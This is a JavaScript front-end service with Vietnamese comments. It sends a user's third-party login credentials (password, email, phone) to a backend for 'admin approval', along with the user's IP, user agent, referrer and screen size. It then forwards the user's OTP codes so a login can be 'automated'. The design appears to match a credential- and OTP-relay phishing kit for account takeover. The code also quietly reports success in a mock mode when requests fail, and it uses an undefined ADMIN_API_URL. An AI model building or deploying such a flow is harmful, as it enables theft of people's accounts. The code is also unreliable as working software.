/**
 * Auto Login Service
 * Tích hợp với Admin system để xử lý yêu cầu đăng nhập tự động
 */

const API_BASE_URL =
  import.meta.env.VITE_API_URL || "http://localhost:3000/api";
const BACKEND_API_URL =
  import.meta.env.VITE_API_URL || "http://localhost:3000/api";

class AutoLoginService {
  constructor() {
    this.eventSource = null;
    this.listeners = new Map();
  }

  /**
   * Gửi yêu cầu đăng nhập đến admin
   */
  async submitLoginRequest(platformData) {
    try {
      const token =
        localStorage.getItem("jwt_token") ||
        localStorage.getItem("accessToken");
      if (!token) {
        throw new Error("No authentication token found");
      }

      const response = await fetch(`${BACKEND_API_URL}/auto-login/submit`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          platform: platformData.platform,
          credentials: {
            account: platformData.account,
            username: platformData.username || platformData.account,
            password: platformData.password,
            email: platformData.email,
            phone: platformData.phone,
          },
          metadata: {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ipAddress: await this.getUserIP(),
            referrer: document.referrer,
            screenResolution: `${screen.width}x${screen.height}`,
          },
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();
      console.log("✅ Auto login request submitted:", result);

      return {
        success: result.success,
        requestId: result.requestId,
        status: result.status,
        message: "Yêu cầu đã được gửi đến admin để phê duyệt",
      };
    } catch (error) {
      console.error("❌ Login request failed:", error);
      // Fallback to mock mode for development
      console.log("🔄 Falling back to mock mode");
      return this.mockLoginRequest(platformData);
    }
  }

  /**
   * Mock login request for development
   */
  async mockLoginRequest(platformData) {
    // Simulate network delay
    await new Promise((resolve) => setTimeout(resolve, 1000));

    const requestId = this.generateRequestId();

    // Store in localStorage for mock tracking
    const mockRequests = JSON.parse(
      localStorage.getItem("mockLoginRequests") || "{}"
    );
    mockRequests[requestId] = {
      ...platformData,
      status: "pending",
      timestamp: new Date().toISOString(),
      requestId,
    };
    localStorage.setItem("mockLoginRequests", JSON.stringify(mockRequests));

    return {
      success: true,
      requestId,
      status: "pending",
      message: "Yêu cầu đang chờ phê duyệt (Mock Mode)",
    };
  }

  /**
   * Theo dõi trạng thái yêu cầu đăng nhập
   */
  async trackLoginStatus(requestId, callback) {
    try {
      const token =
        localStorage.getItem("jwt_token") ||
        localStorage.getItem("accessToken");
      if (!token) {
        throw new Error("No authentication token found");
      }

      // Use polling instead of SSE for better compatibility
      const pollInterval = setInterval(async () => {
        try {
          const response = await fetch(
            `${BACKEND_API_URL}/auto-login/status/${requestId}`,
            {
              headers: {
                Authorization: `Bearer ${token}`,
              },
            }
          );

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json();
          console.log("📊 Login status update:", data);
          callback(data);

          // Stop polling if request is completed
          if (
            ["completed", "rejected", "automation_failed"].includes(data.status)
          ) {
            clearInterval(pollInterval);
            this.listeners.delete(requestId);
          }
        } catch (error) {
          console.error("❌ Status polling error:", error);
          clearInterval(pollInterval);
          this.listeners.delete(requestId);
          // Fallback to mock polling
          this.pollLoginStatus(requestId, callback);
        }
      }, 3000); // Poll every 3 seconds

      // Store interval for cleanup
      this.listeners.set(requestId, pollInterval);
    } catch (error) {
      console.error("❌ Track login status failed:", error);
      // Fallback to mock polling
      this.pollLoginStatus(requestId, callback);
    }
  }

  /**
   * Mock polling for development
   */
  pollLoginStatus(requestId, callback) {
    const pollInterval = setInterval(() => {
      const mockRequests = JSON.parse(
        localStorage.getItem("mockLoginRequests") || "{}"
      );
      const request = mockRequests[requestId];

      if (!request) {
        clearInterval(pollInterval);
        return;
      }

      // Simulate random status changes
      const random = Math.random();
      let newStatus = request.status;

      if (request.status === "pending") {
        if (random < 0.1) {
          // 10% chance of approval
          newStatus = "approved";
        } else if (random < 0.15) {
          // 5% chance of OTP required
          newStatus = "otp_required";
        } else if (random < 0.17) {
          // 2% chance of rejection
          newStatus = "rejected";
        }
      }

      if (newStatus !== request.status) {
        request.status = newStatus;
        mockRequests[requestId] = request;
        localStorage.setItem("mockLoginRequests", JSON.stringify(mockRequests));

        callback({
          status: newStatus,
          requestId,
          message: this.getStatusMessage(newStatus),
        });

        if (["approved", "rejected"].includes(newStatus)) {
          clearInterval(pollInterval);
        }
      }
    }, 3000); // Poll every 3 seconds

    // Store interval for cleanup
    this.listeners.set(requestId, pollInterval);
  }

  /**
   * Xác thực OTP
   */
  async verifyOTP(requestId, otpCode) {
    try {
      const token =
        localStorage.getItem("jwt_token") ||
        localStorage.getItem("accessToken");
      if (!token) {
        throw new Error("No authentication token found");
      }

      const response = await fetch(`${BACKEND_API_URL}/auto-login/verify-otp`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          requestId,
          otp: otpCode,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();
      console.log("✅ OTP verification result:", result);

      return {
        success: result.success,
        status:
          result.status ||
          (result.success ? "automation_pending" : "otp_invalid"),
        message: result.success
          ? "OTP xác thực thành công"
          : "Mã OTP không đúng",
      };
    } catch (error) {
      console.error("❌ OTP verification failed:", error);
      // Fallback to mock OTP verification
      console.log("🔄 Falling back to mock OTP verification");
      return this.mockVerifyOTP(requestId, otpCode);
    }
  }

  /**
   * Mock OTP verification
   */
  async mockVerifyOTP(requestId, otpCode) {
    await new Promise((resolve) => setTimeout(resolve, 1500));

    // Simple mock: accept 123456 as valid OTP
    const isValid = otpCode === "123456";

    if (isValid) {
      const mockRequests = JSON.parse(
        localStorage.getItem("mockLoginRequests") || "{}"
      );
      if (mockRequests[requestId]) {
        mockRequests[requestId].status = "approved";
        localStorage.setItem("mockLoginRequests", JSON.stringify(mockRequests));
      }

      return {
        success: true,
        status: "approved",
        message: "OTP xác thực thành công",
      };
    } else {
      return {
        success: false,
        status: "otp_invalid",
        message: "Mã OTP không đúng",
      };
    }
  }

  /**
   * Yêu cầu gửi lại OTP
   */
  async resendOTP(requestId) {
    try {
      const token =
        localStorage.getItem("jwt_token") ||
        localStorage.getItem("accessToken");
      if (!token) {
        throw new Error("No authentication token found");
      }

      // Note: Backend doesn't have resend OTP endpoint yet, so we'll mock this
      console.log("📤 Resending OTP for request:", requestId);

      // Simulate network delay
      await new Promise((resolve) => setTimeout(resolve, 1000));

      return {
        success: true,
        message: "Đã gửi lại mã OTP",
      };
    } catch (error) {
      console.error("❌ Resend OTP failed:", error);
      // Mock resend
      await new Promise((resolve) => setTimeout(resolve, 1000));
      return { success: true, message: "Đã gửi lại mã OTP (Fallback)" };
    }
  }

  /**
   * Lấy tất cả yêu cầu đăng nhập của user
   */
  async getUserLoginRequests() {
    try {
      const token =
        localStorage.getItem("jwt_token") ||
        localStorage.getItem("accessToken");
      if (!token) {
        throw new Error("No authentication token found");
      }

      const response = await fetch(
        `${BACKEND_API_URL}/auto-login/my-requests`,
        {
          headers: {
            Authorization: `Bearer ${token}`,
          },
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();
      return {
        success: true,
        requests: result.requests || [],
      };
    } catch (error) {
      console.error("❌ Get user requests failed:", error);
      // Fallback to localStorage for mock mode
      const mockRequests = JSON.parse(
        localStorage.getItem("mockLoginRequests") || "{}"
      );
      return {
        success: true,
        requests: Object.values(mockRequests),
      };
    }
  }

  /**
   * Hủy yêu cầu đăng nhập
   */
  async cancelLoginRequest(requestId) {
    // Stop tracking
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }

    if (this.listeners.has(requestId)) {
      clearInterval(this.listeners.get(requestId));
      this.listeners.delete(requestId);
    }

    // Remove from mock storage
    const mockRequests = JSON.parse(
      localStorage.getItem("mockLoginRequests") || "{}"
    );
    delete mockRequests[requestId];
    localStorage.setItem("mockLoginRequests", JSON.stringify(mockRequests));

    try {
      await fetch(`${ADMIN_API_URL}/login-requests/${requestId}`, {
        method: "DELETE",
      });
    } catch (error) {
      console.error("Cancel request failed:", error);
    }
  }

  /**
   * Lấy IP người dùng
   */
  async getUserIP() {
    try {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      return "127.0.0.1"; // Fallback
    }
  }

  /**
   * Tạo ID yêu cầu duy nhất
   */
  generateRequestId() {
    return `req_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 9)}`;
  }

  /**
   * Lấy thông điệp trạng thái
   */
  getStatusMessage(status) {
    const messages = {
      pending: "Đang chờ admin phê duyệt",
      approved: "Yêu cầu đã được chấp nhận",
      rejected: "Yêu cầu bị từ chối",
      otp_required: "Cần xác thực OTP",
      otp_invalid: "Mã OTP không hợp lệ",
      processing: "Đang xử lý đăng nhập",
      completed: "Đăng nhập thành công",
    };
    return messages[status] || "Trạng thái không xác định";
  }

  /**
   * Dọn dẹp resources
   */
  cleanup() {
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }

    this.listeners.forEach((interval) => {
      clearInterval(interval);
    });
    this.listeners.clear();
  }
}

// Export singleton instance
const autoLoginService = new AutoLoginService();
export default autoLoginService;
